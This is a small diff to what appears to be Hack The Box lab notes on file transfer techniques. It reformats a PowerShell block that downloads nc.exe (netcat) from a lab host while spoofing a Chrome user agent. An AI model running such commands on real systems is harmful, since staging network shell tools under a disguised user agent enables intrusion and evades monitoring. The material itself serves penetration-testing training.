@@ -36,7 +36,8 @@ Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
 ### **Request with Chrome User Agent**
 
 ```powershell
-PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::ChromePS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::ChromePS 
+C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
 ```
 
 ```
